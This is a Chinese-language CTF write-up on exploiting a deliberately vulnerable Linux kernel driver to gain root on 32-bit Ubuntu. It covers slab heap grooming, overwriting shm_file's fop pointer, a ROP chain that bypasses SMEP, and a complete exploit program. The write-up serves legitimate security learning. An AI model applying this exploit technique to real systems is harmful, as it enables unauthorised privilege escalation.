# 初识linux内核漏洞利用

0x00 简介
=======

* * *

之前只接触过应用层的漏洞利用， 这次第一次接触到内核层次的，小结一下。

0x01 概况
=======

* * *

这次接触到的，是吾爱破解挑战赛里的一个题，给了一个有问题的驱动程序，要求在ubuntu 14.04 32位系统环境下提权。驱动实现了write函数，但是write可以写0x5a0000000个字节。然后还实现了一个ioctl，这里有任意地址写的问题（但是这个分析里没用到）。还有一个read函数，这个可以读取堆上的数据。驱动的代码可以在这里下载到：[http://www.52pojie.cn/thread-480792-1-1.html](http://www.52pojie.cn/thread-480792-1-1.html)

```
static ssize_t mem_write(struct file *filp, const char __user *buf, size_t size, loff_t *ppos)
{
    unsigned long p =  *ppos;
    unsigned int count = size;
    int ret = 0;
    struct mem_dev *dev = filp->private_data;

    if((dev->size >> 24 & 0xff) != 0x5a) 
    //dev->size == 0x5aXXXXXX
        return -EFAULT;

    if (p > dev->size)
        return -ENOMEM;

    if (count > dev->size - p)
        count = dev->size - p;

    if (copy_from_user((void *)(dev->data + p), buf, count)) {
        ret =  -EFAULT;
    } else {
        *ppos += count;
        ret = count;
    }

    return ret;
}

static long mem_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    struct mem_init data;
    if(!arg)
        return -EINVAL;
    if(copy_from_user(&data, (void *)arg, sizeof(data))) {
        return -EFAULT;
    }
    if(data.len <= 0 || data.len >= 0x1000000)
        return -EINVAL;
    if(data.idx < 0)
        return -EINVAL;
    switch(cmd) {
        case 0:
            mem_devp[data.idx].size = 0x5a000000 | (data.len & 0xffffff);
            mem_devp[data.idx].data = kmalloc(data.len, GFP_KERNEL);
            printk(KERN_DEBUG "heap:%p\n",mem_devp[data.idx].data);
            if(!mem_devp[data.idx].data) {
                return -ENOMEM;
            }
            memset(mem_devp[data.idx].data, 0, data.len);
            break;
        default:
            return -EINVAL;
    }

    return 0;
}

static ssize_t mem_read(struct file *filp, char __user *buf, size_t size, loff_t *ppos)
{
    unsigned long p =  *ppos;
    unsigned int count = size;
    int ret = 0;
    struct mem_dev *dev = filp->private_data;

    if((dev->size >> 24 & 0xff) != 0x5a)
        return -EFAULT;

    if (p > dev->size)
        return -ENOMEM;

    if (count > dev->size - p)
        count = dev->size - p;

    if (copy_to_user(buf, (void*)(dev->data + p), count)) {
        ret =  -EFAULT;
    } else {
        *ppos += count;
        ret = count;
    }

    return ret;
}

```

write里的dev->data是通过调用ioctl后kmalloc出来的，kmalloc的size可以自行指定。于是通过这个write，可以写内核堆，甚至写到内核栈里。我用的方法是覆盖内核某个堆结构，改掉其上的某个指针，最好是某个函数指针，或者函数表指针。具体的是shmid_kernel结构的file指针，里面存有shm_ops，这是shm的函数表，里面有shm_mmap，而这个函数可以在用户态通过shmat调用到。shmid_kernel这个结构体，则会通过在系统调用shmget时，被kmalloc。在我操作的机器上（32位）：

![Alt text](http://drops.javaweb.org/uploads/images/d919adc9537eaa02c428aba40a3ee018d7aa29a4.jpg)

shmid_kernel分配时的大小是64+92 = 156:

![Alt text](http://drops.javaweb.org/uploads/images/a254f48895a186f62df0476730b6b270c7badfce.jpg)

```
struct shmid_kernel //结构体大小为92bytes
{   
    struct kern_ipc_perm    shm_perm;
    struct file     *shm_file;
    unsigned long       shm_nattch;
    unsigned long       shm_segsz;
    time_t          shm_atim;
    time_t          shm_dtim;
    time_t          shm_ctim;
    pid_t           shm_cprid;
    pid_t           shm_lprid;
    struct user_struct  *mlock_user;
    struct task_struct  *shm_creator;
    struct list_head    shm_clist;  
};

```

0x02 覆盖前的堆排布
============

* * *

要保证能覆盖到特定的结构，首先是要保证，申请到的内存是相邻的。内核里kmalloc是slab的分配机制。一次至少会分配一个页面，然后把这个页面分为很多个连续的块，这些块的信息，可以通过**cat /proc/slabinfo**看到：

![Alt text](http://drops.javaweb.org/uploads/images/04068bf4d1d27756ba3aa94ed6ec59c304a11385.jpg)

分配的时候，是向上对齐的。比如，如果kmalloc的size满足区间(128,192]，那么就会给它分配一个192大小的块。如果有空闲的块，则把空闲的块分配出去。只有当所有分配的slab里的块，都被占用了，才会去分配新的slab（里面有很多相邻内存的大小相同的块）。比如说需要一个192的块，而已经分配的192的slab里没有空闲的，就会分配一个页面的内存，里面分成4096/192 = 21个192bytes的块，然后拿出第一块分配出去，再申请，则拿出第二块，以此类推。

//slab的图

所以，如果我们想要得到两个相邻的块。有这么几点要求：

*   申请的两个块的大小是处于同一区间的（这里假设都是申请192的块）
*   申请之前得消耗掉所有空闲的大小为192的块
*   两个块要连续申请。也就是申请第一个块之后要马上申请第二个。

所以，在这里来说，我们想要通过write，来覆盖掉下一个堆块，即我们的目标堆块shmid_kernel （占用一个192的slab块），要这么做：

*   不断调用ioctl(fd,0,&arg),并设置arg.idx = 192,来消耗掉空闲的192大小的slab块。
*   马上调用shmget(IPC_PRIVATE,1024,IPC_CREAT | 0666)来申请一块192的空间。这时，这个块有20/21的概率，我们最后一次ioctl得到的块，是相邻的。
    
    ```
    arg.idx = 0;
    arg.len = 192;
    for(i=0;i<1000;i++)
        ioctl(fd,0,&arg);
    shmid = shmget(IPC_PRIVATE,1024,IPC_CREAT | 0666);
    arg.idx = 1;
    ioctl(fd,0,&arg);
    
    ```

这之后再用write来进行覆盖，就能达到我们的目的。

0x03 overflow shmid_kernel
==========================

* * *

为了确保我们的堆排布好了，我给这个有漏洞的驱动，patch了一行代码，使得能够把每次kmalloc的地址打印出来：

![Alt text](http://drops.javaweb.org/uploads/images/552e684b1a3d8dbf93ebc332dc27974d17992483.jpg)

而且在exp里，调用shmget之后，再一次调用ioctl来kmalloc一个192的块。那么得到的dmesg：

![Alt text](http://drops.javaweb.org/uploads/images/c6e8d37578d2047b3a056193ddd50e03e50308f8.jpg)

最后两次 ioctl，中间相隔了2个0xC0的大小，其中一个应该是shmid_kernel。那么还有一个是什么？通过调用驱动的read，读取这段堆上的内存，我发现：还有一个是shmid_kernel结构的shm_file，排布是这样的：

| addr | type |
| :-- | --: |
| 0xc04e43c0 | dev[0]->data |
| 0xc04e4480 | shmid_kernel |
| 0xc04e4540 | shmid_file |
| 0xc04e4600 | dev[1](http://drops.javaweb.org/uploads/images/d919adc9537eaa02c428aba40a3ee018d7aa29a4.jpg)->data |

![Alt text](http://drops.javaweb.org/uploads/images/bd58165b7ab2d3c837e4af682973a249df26feed.jpg)

最开始的计划，是覆盖shmid_kernel结构的shmid_file指针（shmid_kernel+0x6c），但是现在发现可以直接覆盖shmid_file的fop（shmid_file+0x14），这是指向其file_operations的指针。我们只要把这个指针覆盖，就能伪造file_operations，于是伪造一个file_operations，在偏移0x40处，指定0x41414141。其余的内容，由于我们可以通过read读取堆内容，所以write的时候，直接复制过去，改别的。 但是如果没有read，我们也可以自己伪造一个shmid_kernel，当然肯定会麻烦一些。因为有一些检查是要绕过的。

```
read(fd[2],readbuf,oversize); //由于llseek的限制,fd [0,1,2]做一个区分
memcpy(buf,readbuf,oversize);
map = mmap((void *)0x5a000000,0x1000,PROT_WRITE|PROT_READ | PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
memcpy(map,41,0x100);
struct file **shm_file;
shm_file = (struct file **)(buf+0x194);
*shm_file = (void *)0x5a000000;  

//fack_fop == 0x5a000000;
//fack_fop_mmap == 0x41414141;

write(fd[0],buf,oversize);
ret = shmat(shmid,NULL,0);

```

那么，调用shmat的时候，最终会调用:  
shmid_kernel->shm_file->fop->mmap(...)。这个时候，我们就能得到内核的控制流。

![Alt text](http://drops.javaweb.org/uploads/images/c973ec176c153604d8b7e82625459919fffa45f1.jpg)

0x04 SMEP
=========

* * *

得到控制流后，最开始我是这么想的：

**将控制流转移到用户态的代码里来，进行提权**，代码可以是这样子：

```
int __attribute__((regparm(3))) 
kernel_code(struct file *file, void *vma)
{
    commit_creds(prepare_kernel_cred(0));
    return -1;
}

```

但是，这样只能针对没有开启**SMEP**(Supervisor Mode Execution Protection Enable)的情况。

什么是SMEP？简单来说，就是禁止内核执行用户控件的代码。它存在于CR4寄存器的第20 bit。

![Alt text](http://drops.javaweb.org/uploads/images/d3740a55cc9e53ccd70a08908d99847319393ed8.jpg)

在安卓上，也叫PXN。因为传统的内核提权漏洞利用，得到控制流之后，直接跳转到用户空间执行提权代码，实在是太轻松，所以就加了这么一个缓解机制。

由于系统开了SMEP，这样就只能在内核找ROP来拼凑提权代码了。

0x05 ROP & 栈移植
==============

* * *

构造ROP来调用

```
commit_creds(prepare_kernel_cred(0);

```

通过cat /proc/kallsyms得到符号表之后，可以定位prepare_kernel_cred和commit_creds的地址：

*   C1082B60 T commit_creds
*   C1082E20 T prepare_kernel_cred

只有prepare_kernel_cred(0)需要一个参数，传进去。看了下prepare_kernel_cred函数的汇编，这个参数用eax传递。所以需要一条

```
pop eax
ret

```

或者是

```
xor eax,eax
ret

```

prepare_kernel_cred的返回值，会直接传给commit_creds，并不用在rop链里构造。那么初步的应该是这样子：

| instruction | addr |
| :-- | --: |
| pop eax;ret; | 0xc1431272 |
| perpare_kernel_creds; | 0xc1082e20 |
| commit_cred; | 0xc1082b60 |

问题来了：

rop链，首先要写到栈里面去，问题是如何写。

![Alt text](http://drops.javaweb.org/uploads/images/c973ec176c153604d8b7e82625459919fffa45f1.jpg)

最后获得控制流之前，eax 是内核堆上的地址，是shmid_kerneld的shm_file，里面的内容我们可以控制。ecx是伪造的fop表地址，我们可以完全控制。不好往栈里头写数据，不妨把栈给移植到能控制的地方来。

于是我第一次找的**xchg ecx,esp**这样的指令。但是一执行，系统就崩了。具体原因，本人猜测应该是内核栈esp不能指向用户空间。具体什么原因，也没深究。

所以第二次，我找的**xchg eax,esp；ret 0x100**这样的指令。因为eax是shmid_file，还在内核空间，而其后面的数据都可以通过write控制，也就相当于能控制栈。还不用改写shmid_file，只用在shmid_file头4个字节写上**pop eax;ret;**的地址，xchg之后的ret能顺利执行就OK了。

```
memcpy(buf+0x180,rop,4);
//rop[0] = 0xc1431272 ;
//pop eax 
//ret

```

0x06 内核态返回
==========

* * *

最后一个问题，内核态如何返回用户态。

因为我们移植了内核栈，而内核态返回用户态的时候，需要从内核栈里头，弹出cs,eip,eflag,ss,esp等信息。当然，我们可以自己构造虚假的。但是内核栈里头有很多结构体，特别是提取时候要用到的task结构体，就在内核栈开始的地方。我没有试过构造虚假的内核栈，因为感觉太繁琐，而且也不知道可不可行。

于是我采取的是另外一种思路：

**把移植过来的栈，又移植回去。**

所以，我需要一个寄存器，来保存被移植前的esp。而prepare_kernel_cred() 和 commit_creds()。会对esi,edi,ebx三个寄存器进行保护：

![Alt text](http://drops.javaweb.org/uploads/images/966d33619489567223e1e1abf4ad50b354f32216.jpg)

我选择其中的esi来保存原始内核栈esp。那么rop链就变成了这样子：

| instruction | addr |  |
| :-- | --- | --- |
| xchg eax,esp;ret | 0xc1020eb1 | 覆盖到shm_mmap的指针 |
| xchg eax,esi;ret | 0xc1071395 | 覆盖shm_file的前四个字节 |
| pop eax;ret; | 0xc1431272 | fack_stask |
|  |  | fack_stask |
| perpare_kernel_creds; | 0xc1082e20 | fack_stask |
| commit_cred; | 0xc1082b60 | fack_stask |
| xchg eax,esi;ret | 0xc1071395 | fack_stask |
| xchg eax,esp;ret | 0xc1020eb1 | fack_stask |

0x07 get root shell
===================

* * *

最后，我们再用户态，调用：

```
setresuid(0, 0, 0);
setresgid(0, 0, 0);
execl("/bin/bash","/bin/bash",NULL);

```

整个提权利用，就完成了。

![Alt text](http://drops.javaweb.org/uploads/images/72769fec8385214acaa1747e48f761612a65671a.jpg)

0x08 exp
========

有很多的内核漏洞文章，讲了很多的内核漏洞利用技术：

修改ptmx->fop，修改addr_limit，修改task结构，修改中断描述符，将SMEP位反位等等，都博大精深。学习的路还很长很长。下面是这次提权的代码：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define oversize 0x400
struct mem_init {
    unsigned int idx;
    unsigned int len;
};

int prepare_kernel_creds = 0xc1082e20;
int commit_creds = 0xc1082b60; 

int main(){
    int fd[3],ret,i;
    int shmid;
    int *map;
    void *buf,*readbuf;
    struct mem_init arg;
    fd[0] = open("/dev/memdev0",O_RDWR);
    fd[1] = open("/dev/memdev1",O_RDWR);
    fd[2] = open("/dev/memdev2",O_RDWR);
    for(i=0;i<3;i++)
        if(fd[i] < 0){
            printf("[-]open driver failed!\n");
            return 0;
        }
    printf("[+]open driver success\n");

    //prepare heap
    arg.idx = 0;
    arg.len = 92+0x40;
    for(i=0;i<1000;i++){
        ioctl(fd[0],0,&arg);
    }
    arg.idx = 1;
    ioctl(fd[1],0,&arg);
    arg.idx = 2;
    ioctl(fd[2],0,&arg);

    buf = malloc(oversize);
    readbuf = malloc(oversize);

    shmid = shmget(IPC_PRIVATE, 1024, IPC_CREAT | 0666);
    printf("%d\n",shmid);
    arg.idx = 3;
    ioctl(fd[0],0,&arg);
    printf("[+] heap prepare OK!\n");


    read(fd[2],readbuf,oversize); //read heap data
    memcpy(buf,readbuf,oversize); 


    read(fd[0],readbuf,192*2); //set llseek point

    map = mmap((void *)0x5a000000,0x1000,PROT_WRITE|PROT_READ | PROT_EXEC, 
MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    int **shm_file;
    shm_file = (int **)(buf+0x194); //fack fop
    *shm_file = (void *)0x5a000000;


    int rop[11];
    rop[0] = 0xc1071395; //xchg eax,esi;ret
    rop[1] = 0xc1431272; //pop eax;ret
    rop[2] = 0; //eax
    rop[3] = prepare_kernel_creds;
    rop[4] = commit_creds;
    rop[5] = 0xc1071395; //xchg eax,esi;ret
    rop[6] = 0xc1020eb1; //xchg eax,esp;ret
    rop[7] = 0;
    rop[8] = 0;
    rop[9] = 0;
    rop[10] = 0xc1380373; //xchg eax,esp;ret 0x100

    //  xchg eax,esp;ret
    //  xchg eax,esi;ret  ;
    //  pop eax;ret;  0xc1431272
    //  perpare_kernel_creds
    //  commit_cred
    //  xchg eax,esi;ret
    //  xchg eax,esp;ret

    memcpy(map,rop,4*30);  //map is fack fop

    memcpy(buf+0x180,rop,4); //after xchg eax,esp . ret
    memcpy(buf+0x280,rop,4*30);//fack  stack
    write(fd[0],buf,oversize);

    printf("[+] heap write done\n");
    printf("[+] read to triggle shellcode\n");  

    ret = (int)shmat(shmid,NULL,0); //triggle

    if(ret!=0)
        printf("[+] OK,ready to get root!\n   press any key\n");
    getchar();
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    execl("/bin/bash","/bin/bash",NULL);
    return 0;
}

```

0x09 参考链接
=========

* * *

*   [http://old.sebug.net/paper/pst_WebZine/pst_WebZine_0x05/0x09_Exploit%20Linux%20Kernel%20Slub%20Overflow.html](http://old.sebug.net/paper/pst_WebZine/pst_WebZine_0x05/0x09_Exploit%20Linux%20Kernel%20Slub%20Overflow.html)
*   [http://drops.wooyun.org/tips/7764](http://drops.wooyun.org/tips/7764)
*   [https://cyseclabs.com/page?n=17012016](https://cyseclabs.com/page?n=17012016)